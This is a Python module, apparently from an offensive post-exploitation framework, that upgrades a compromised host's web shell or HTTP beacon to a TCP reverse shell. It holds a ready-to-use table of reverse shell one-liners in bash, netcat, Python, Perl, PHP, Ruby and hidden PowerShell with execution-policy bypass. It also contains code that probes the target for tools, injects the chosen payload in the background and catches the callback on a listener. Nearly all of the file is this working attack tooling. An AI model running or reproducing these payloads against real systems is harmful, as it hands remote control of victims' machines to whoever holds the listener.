"""
HTTP shell upgrader - Transition web shell/beacon to TCP reverse shell.

Features:
- Detect web shell type (PHP, ASP, JSP, Python)
- Generate reverse shell payloads
- Inject payload via HTTP beacon
- Transition to TCP session
- Multiple upgrade strategies
"""

import socket
import subprocess
import threading
import time
import logging
from typing import Dict, Any, Optional, Tuple
from pathlib import Path

from ..models import Session
from ..config import SessionConfig
from ..events import EventBus, SessionEvent

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class HTTPShellUpgrader:
    """Upgrade HTTP beacon to TCP reverse shell.

    Strategies:
    1. Detect web shell/beacon capabilities
    2. Generate appropriate reverse shell payload
    3. Inject payload via beacon command queue
    4. Start TCP listener
    5. Wait for connection
    6. Create new TCP session
    7. Mark HTTP session as 'upgraded'

    Example:
        >>> upgrader = HTTPShellUpgrader(session_manager, http_listener)
        >>> new_session = upgrader.upgrade_to_tcp(
        ...     http_session_id='abc123',
        ...     lhost='192.168.45.150',
        ...     lport=4444
        ... )
    """

    def __init__(self, session_manager: Any, http_listener: Any):
        """Initialize HTTP shell upgrader.

        Args:
            session_manager: SessionManager instance
            http_listener: HTTPListener instance
        """
        self.session_manager = session_manager
        self.http_listener = http_listener
        self.config = SessionConfig()

        # Reverse shell payload templates
        self.payloads = {
            'bash': 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1',
            'bash_mkfifo': 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <LHOST> <LPORT> >/tmp/f',
            'nc_e': 'nc -e /bin/bash <LHOST> <LPORT>',
            'nc_c': 'nc -c bash <LHOST> <LPORT>',
            'python': 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])\'',
            'python3': 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])\'',
            'perl': 'perl -e \'use Socket;$i="<LHOST>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};\'',
            'php': 'php -r \'$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/bash -i <&3 >&3 2>&3");\'',
            'ruby': 'ruby -rsocket -e\'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)\'',
            'powershell': 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()',
            'powershell_short': '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
        }

    def detect_capabilities(self, session_id: str) -> Dict[str, Any]:
        """Detect web shell/beacon capabilities.

        Sends test commands to determine:
        - Shell type (bash, sh, cmd, powershell)
        - Available tools (python, nc, perl, php, ruby)
        - OS type (Linux, Windows)

        Args:
            session_id: HTTP session identifier

        Returns:
            Dictionary with detected capabilities:
            {
                'shell_type': 'bash',
                'os': 'Linux',
                'detected_tools': ['python3', 'nc', 'perl'],
                'recommended_payload': 'python3'
            }
        """
        logger.info(f"Detecting capabilities for session {session_id}")

        capabilities = {
            'shell_type': 'unknown',
            'os': 'unknown',
            'detected_tools': [],
            'recommended_payload': None
        }

        # Test commands
        test_commands = {
            'os': 'uname -s || echo Windows',
            'shell': 'echo $SHELL || echo %COMSPEC%',
            'python': 'which python 2>/dev/null || where python 2>nul',
            'python3': 'which python3 2>/dev/null || where python3 2>nul',
            'nc': 'which nc 2>/dev/null || where nc 2>nul',
            'perl': 'which perl 2>/dev/null || where perl 2>nul',
            'php': 'which php 2>/dev/null || where php 2>nul',
            'ruby': 'which ruby 2>/dev/null || where ruby 2>nul',
            'powershell': 'where powershell 2>nul'
        }

        # Send test commands
        for test_name, command in test_commands.items():
            self.http_listener.send_command(session_id, command)

        # Wait for responses
        time.sleep(3)

        # Collect responses
        responses = self.http_listener.get_all_responses(session_id)

        # Parse responses
        if responses:
            for i, (test_name, _) in enumerate(test_commands.items()):
                if i < len(responses):
                    output = responses[i].get('output', '').strip()

                    if test_name == 'os':
                        if 'Linux' in output:
                            capabilities['os'] = 'Linux'
                        elif 'Windows' in output or 'WINDOWS' in output:
                            capabilities['os'] = 'Windows'

                    elif test_name == 'shell':
                        if 'bash' in output:
                            capabilities['shell_type'] = 'bash'
                        elif 'sh' in output:
                            capabilities['shell_type'] = 'sh'
                        elif 'cmd' in output or 'CMD' in output:
                            capabilities['shell_type'] = 'cmd'
                        elif 'powershell' in output.lower():
                            capabilities['shell_type'] = 'powershell'

                    else:
                        # Tool detection
                        if output and '/' in output or '\\' in output:
                            capabilities['detected_tools'].append(test_name)

        # Determine recommended payload
        if capabilities['os'] == 'Windows':
            if 'powershell' in capabilities['detected_tools']:
                capabilities['recommended_payload'] = 'powershell'
        else:
            # Linux
            if 'python3' in capabilities['detected_tools']:
                capabilities['recommended_payload'] = 'python3'
            elif 'python' in capabilities['detected_tools']:
                capabilities['recommended_payload'] = 'python'
            elif 'nc' in capabilities['detected_tools']:
                capabilities['recommended_payload'] = 'nc_e'
            elif 'perl' in capabilities['detected_tools']:
                capabilities['recommended_payload'] = 'perl'
            else:
                capabilities['recommended_payload'] = 'bash'

        logger.info(f"Detected capabilities: {capabilities}")

        return capabilities

    def generate_reverse_shell_payload(
        self,
        payload_type: str,
        lhost: str,
        lport: int
    ) -> str:
        """Generate reverse shell payload.

        Args:
            payload_type: Payload type ('bash', 'python3', 'nc_e', etc.)
            lhost: Listener host (your IP)
            lport: Listener port

        Returns:
            Reverse shell payload command

        Raises:
            ValueError: If payload_type not supported
        """
        if payload_type not in self.payloads:
            raise ValueError(
                f"Unsupported payload type: {payload_type}. "
                f"Supported: {', '.join(self.payloads.keys())}"
            )

        template = self.payloads[payload_type]

        # Substitute variables
        payload = template.replace('<LHOST>', lhost)
        payload = payload.replace('<LPORT>', str(lport))

        return payload

    def inject_payload(
        self,
        session_id: str,
        payload: str,
        background: bool = True
    ) -> bool:
        """Inject reverse shell payload via beacon.

        Args:
            session_id: HTTP session identifier
            payload: Reverse shell command
            background: Run payload in background (default: True)

        Returns:
            True if payload injected successfully
        """
        # Add background operator if needed
        if background and not payload.endswith('&'):
            payload = f"({payload}) &"

        logger.info(f"Injecting payload to session {session_id}: {payload}")

        # Send payload command
        self.http_listener.send_command(session_id, payload)

        return True

    def start_tcp_listener(self, lhost: str, lport: int, timeout: int = 30) -> Tuple[Optional[socket.socket], Optional[Tuple[str, int]]]:
        """Start TCP listener and wait for connection.

        Args:
            lhost: Host to bind to
            lport: Port to listen on
            timeout: Connection timeout in seconds

        Returns:
            Tuple of (client_socket, client_address) or (None, None) if timeout
        """
        logger.info(f"Starting TCP listener on {lhost}:{lport}")

        # Create socket
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        try:
            server_socket.bind((lhost, lport))
            server_socket.listen(1)
            server_socket.settimeout(timeout)

            logger.info(f"Waiting for connection (timeout: {timeout}s)...")

            # Accept connection
            client_socket, client_address = server_socket.accept()

            logger.info(f"Connection received from {client_address}")

            return client_socket, client_address

        except socket.timeout:
            logger.warning("Connection timeout")
            return None, None

        except Exception as e:
            logger.error(f"Listener error: {e}")
            return None, None

        finally:
            server_socket.close()

    def upgrade_to_tcp(
        self,
        http_session_id: str,
        lhost: str,
        lport: int,
        payload_type: Optional[str] = None,
        timeout: int = 30
    ) -> Optional[Session]:
        """Upgrade HTTP beacon to TCP reverse shell.

        Complete upgrade workflow:
        1. Detect capabilities (if payload_type not specified)
        2. Generate reverse shell payload
        3. Start TCP listener
        4. Inject payload via beacon
        5. Wait for connection
        6. Create new TCP session
        7. Mark HTTP session as upgraded

        Args:
            http_session_id: HTTP session identifier
            lhost: Listener host (your IP)
            lport: Listener port
            payload_type: Payload type (auto-detected if None)
            timeout: Connection timeout in seconds

        Returns:
            New TCP Session instance or None if upgrade failed

        Example:
            >>> upgrader = HTTPShellUpgrader(manager, listener)
            >>> tcp_session = upgrader.upgrade_to_tcp(
            ...     http_session_id='abc123',
            ...     lhost='192.168.45.150',
            ...     lport=4444
            ... )
        """
        logger.info(f"Upgrading HTTP session {http_session_id} to TCP")

        # Get HTTP session
        http_session = self.session_manager.get_session(http_session_id)
        if not http_session:
            raise ValueError(f"Session {http_session_id} not found")

        # Mark as upgrading
        http_session.mark_upgrading()
        self.session_manager.update_session(http_session_id, {'status': 'upgrading'})

        try:
            # Step 1: Detect capabilities if payload type not specified
            if not payload_type:
                logger.info("Auto-detecting capabilities...")
                capabilities = self.detect_capabilities(http_session_id)
                payload_type = capabilities.get('recommended_payload')

                if not payload_type:
                    raise RuntimeError("Could not determine appropriate payload type")

                logger.info(f"Using payload type: {payload_type}")

            # Step 2: Generate payload
            payload = self.generate_reverse_shell_payload(payload_type, lhost, lport)
            logger.info(f"Generated payload: {payload}")

            # Step 3: Start TCP listener in background thread
            connection_result = {'socket': None, 'address': None}

            def listener_thread():
                sock, addr = self.start_tcp_listener(lhost, lport, timeout)
                connection_result['socket'] = sock
                connection_result['address'] = addr

            thread = threading.Thread(target=listener_thread)
            thread.start()

            # Wait for listener to start
            time.sleep(1)

            # Step 4: Inject payload
            self.inject_payload(http_session_id, payload, background=True)

            # Step 5: Wait for connection
            thread.join(timeout=timeout + 5)

            if not connection_result['socket']:
                raise RuntimeError("No connection received (timeout)")

            client_socket = connection_result['socket']
            client_address = connection_result['address']

            # Step 6: Create new TCP session
            tcp_session = self.session_manager.create_session(
                type='tcp',
                target=client_address[0],
                port=lport,
                protocol='reverse',
                shell_type=http_session.shell_type,
                metadata={
                    'upgraded_from': http_session_id,
                    'upgrade_method': payload_type,
                    'original_target': http_session.target,
                    'upgrade_time': time.time()
                }
            )

            # Step 7: Mark HTTP session as upgraded
            self.session_manager.update_session(http_session_id, {
                'status': 'upgraded',
                'metadata': {
                    **http_session.metadata,
                    'upgraded_to': tcp_session.id,
                    'upgrade_time': time.time()
                }
            })

            # Emit event
            EventBus.publish(SessionEvent.SESSION_UPGRADED, {
                'session_id': tcp_session.id,
                'original_session_id': http_session_id,
                'method': payload_type,
                'type': 'http_to_tcp'
            })

            logger.info(f"Successfully upgraded to TCP session {tcp_session.id}")

            # Close the socket (session manager should handle this in production)
            client_socket.close()

            return tcp_session

        except Exception as e:
            logger.error(f"Upgrade failed: {e}")

            # Revert HTTP session status
            self.session_manager.update_session(http_session_id, {'status': 'active'})

            raise RuntimeError(f"Upgrade failed: {e}")

    def list_available_payloads(self) -> Dict[str, str]:
        """List all available reverse shell payloads.

        Returns:
            Dictionary of payload_type -> template
        """
        return self.payloads.copy()

    def get_payload_info(self, payload_type: str) -> Optional[Dict[str, Any]]:
        """Get information about a payload type.

        Args:
            payload_type: Payload type

        Returns:
            Dictionary with payload info or None if not found
        """
        if payload_type not in self.payloads:
            return None

        template = self.payloads[payload_type]

        # Determine requirements and OS
        info = {
            'type': payload_type,
            'template': template,
            'os': 'Windows' if 'powershell' in payload_type else 'Linux',
            'requirements': []
        }

        # Parse requirements
        if 'python3' in payload_type:
            info['requirements'] = ['python3']
        elif 'python' in payload_type:
            info['requirements'] = ['python']
        elif 'nc' in payload_type:
            info['requirements'] = ['netcat']
        elif 'perl' in payload_type:
            info['requirements'] = ['perl']
        elif 'php' in payload_type:
            info['requirements'] = ['php']
        elif 'ruby' in payload_type:
            info['requirements'] = ['ruby']
        elif 'powershell' in payload_type:
            info['requirements'] = ['powershell']
        elif 'bash' in payload_type:
            info['requirements'] = ['bash']

        return info
